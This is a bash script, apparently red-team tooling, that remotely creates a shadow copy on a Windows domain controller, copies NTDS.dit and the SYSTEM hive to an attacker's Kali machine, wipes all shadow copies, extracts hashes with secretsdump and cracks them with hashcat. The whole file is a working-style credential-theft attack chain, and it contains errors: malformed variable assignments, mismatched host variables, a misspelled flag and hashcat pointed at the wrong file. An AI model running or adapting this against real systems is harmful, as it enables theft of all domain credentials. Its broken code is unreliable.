# ./windows_shadow_copy.sh

# Script to create and store the shadow copy of the NTDS.dit file into the host machine

# Check if all the environment variables have been set

$NTDS_FILE="ntds.dit"
$SYSTEM_FILE="system"
$OUTPUT_FILE="exthash"

if [ -z "$TARGET_IP" ];
then
    echo "TARGET_IP not set"
fi

if [ -z "$USERNAME" ];
then
    echo "USERNAME not set"
fi

if [ -z "$PASSWORD" ];
then
    echo "PASSWORD not set"
fi

#Check if PowerShell is installed
if ! command -v pwsh &>/dev/null;
then
    echo "Powershell is not installed"
fi

# Execute PowerShell commands remotely to create shadow copy
echo "Creating shadow copy of volume C: on $TARGET_IP..."

# Note: Need to check the ETC for the following command 
pwsh -Command "Invoke-Command -ComputerName $TARGET_IP -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '$USERNAME', (ConvertTo-SecureString -String '$PASSWORD' -AsPlainText -Force)) -ScriptBlock { vssadmin create shadow /for=C: }"

if [ $? -ne 0 ]; then
    echo "Failed to create shadow copy."
    exit 1
fi

echo "Shadow copy created successfully."

# Extract NTDS.dit file from the shadow copy
echo "Extracting NTDS.dit file from the shadow copy..."
NTDS_PATH=$(pwsh -Command "Invoke-Command -ComputerName $TARGET_IP -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '$USERNAME', (ConvertTo-SecureString -String '$PASSWORD' -AsPlainText -Force)) -ScriptBlock { Get-WmiObject -Query 'SELECT * FROM Win32_ShadowCopy' | Select-Object -ExpandProperty DeviceObject }")

if [ -z "$NTDS_PATH" ]; then
    echo "Failed to retrieve NTDS.dit file path."
    exit 1
fi

echo "NTDS.dit file path: $NTDS_PATH"

# Transfer the NTDS.dit file over to the Kali box
# Currently set to save in the current directory running the script
scp "$USERNAME@$IP_ADDRESS:$NTDS_PATH\\Windows\\NTDS\\NTDS.dit" "/$NTDS_FILE"

# Transfer the system registry file 
scp "$USERNAME@$IP_ADDRESS:$NTDS_PATH\\System32\\config\\SYSTEM" "/system"

if [ $? -ne 0 ];
then
    echo "Failed to copy NTDS.dit file to Kali box."
    exit 1
else
    echo "NTDS.dit file copied successfully."
fi

# Cleanup: Delete the shadow copy
echo "Deleting shadow copy..."
pwsh -Command "Invoke-Command -ComputerName $IP_ADDRESS -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '$USERNAME', (ConvertTo-SecureString -String '$PASSWORD' -AsPlainText -Force)) -ScriptBlock { vssadmin delete shadows /all /quiet }"

echo "Cleanup complete. Script finished."

if ! command -v secretsdump.py &> /dev/null;
then
    echo "Secrets dump not installed. Install from repository. Refer to documentation."
fi

# Run the Secrets Dump on the NTDS.dit file
secretsdump.py -ntds "$NTDS_FILE" -sytstem "$SYSTEM_FILE" -outputfile "$OUTPUT_FILE" LOCAL

# Crack the hashes
hashcat -m 1000 "$NTDS_FILE" "$WORD_LIST_FILE"